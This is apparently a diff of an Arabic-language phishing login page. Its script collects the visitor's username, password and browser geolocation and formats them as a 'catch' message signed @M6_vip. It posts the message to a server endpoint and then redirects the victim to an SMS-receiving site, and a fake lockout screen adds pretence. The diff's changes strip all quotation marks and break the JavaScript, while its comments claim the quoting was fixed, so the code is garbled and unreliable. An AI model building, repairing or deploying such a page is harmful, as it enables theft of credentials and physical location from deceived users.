@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -15,7 +16,7 @@
         }
 
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0; padding: 0; font-family:  Segoe UI , Tahoma, sans-serif;
             background: radial-gradient(circle at top right, #1e293b, #0f172a);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white); overflow: hidden;
@@ -84,60 +85,61 @@
 <script>
     var loginAttempts = 0;
 
-    document.getElementById('loginForm').onsubmit = function(e) {
+    document.getElementById( loginForm ).onsubmit = function(e) {
         e.preventDefault();
-        var u = document.getElementById('user').value.trim();
-        var p = document.getElementById('pass').value;
+        var u = document.getElementById( user ).value.trim();
+        var p = document.getElementById( pass ).value;
 
         if (u.length >= 5 && p.length >= 6) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    var loc = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
+                    // رابط الموقع الجغرافي مصلح بالكامل
+                    var loc =  https://www.google.com/maps?q=  + position.coords.latitude +  ,  + position.coords.longitude;
                     send(u, p, loc);
                 }, function() {
-                    send(u, p, 'الموقع مرفوض 📍');
+                    send(u, p,  الموقع مرفوض 📍 );
                 });
             } else {
-                send(u, p, 'المتصفح لا يدعم الموقع ❌');
+                send(u, p,  المتصفح لا يدعم الموقع ❌ );
             }
         } else {
             loginAttempts++;
             if (loginAttempts >= 3) {
                 showBan();
             } else {
-                Swal.fire({ title: 'خطأ', text: 'بيانات غير دقيقة', icon: 'error' });
+                Swal.fire({ title:  خطأ , text:  بيانات غير دقيقة , icon:  error  });
             }
         }
     };
 
     function showBan() {
-        document.getElementById('mainCard').classList.add('is-banned');
-        document.getElementById('banOverlay').style.display = 'block';
+        document.getElementById( mainCard ).classList.add( is-banned );
+        document.getElementById( banOverlay ).style.display =  block ;
         var left = 30;
         var cd = setInterval(function() {
             left--;
-            document.getElementById('timer').innerText = left;
+            document.getElementById( timer ).innerText = left;
             if (left <= 0) {
                 clearInterval(cd);
-                document.getElementById('mainCard').classList.remove('is-banned');
-                document.getElementById('banOverlay').style.display = 'none';
+                document.getElementById( mainCard ).classList.remove( is-banned );
+                document.getElementById( banOverlay ).style.display =  none ;
                 loginAttempts = 0;
             }
         }, 1000);
     }
 
     function send(u, p, l) {
-        // تم إصلاح علامات الاقتباس والربط هنا لضمان الإرسال
-        var fullMsg = '🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم: ' + u + '\n🔑 كلمة السر: ' + p + '\n📍 الموقع: ' + l + '\n\n👤 @M6_vip';
+        // السطر 132 المصلح: لاحظ وجود علامات الاقتباس في البداية والنهاية
+        var fullMsg =  🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم:   + u +  \n🔑 كلمة السر:   + p +  \n📍 الموقع:   + l +  \n\n👤 @M6_vip ;
 
-        fetch('/api/save', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+        fetch( /api/save , {
+            method:  POST ,
+            headers: {  Content-Type :  application/json  },
             body: JSON.stringify({ message: fullMsg })
         }).then(function() {
-            window.location.href = 'https://receive-smss.com/';
+            window.location.href =  https://receive-smss.com/ ;
         }).catch(function(err) {
-            console.error('Error:', err);
+            console.error( Error: , err);
         });
     }
 </script>
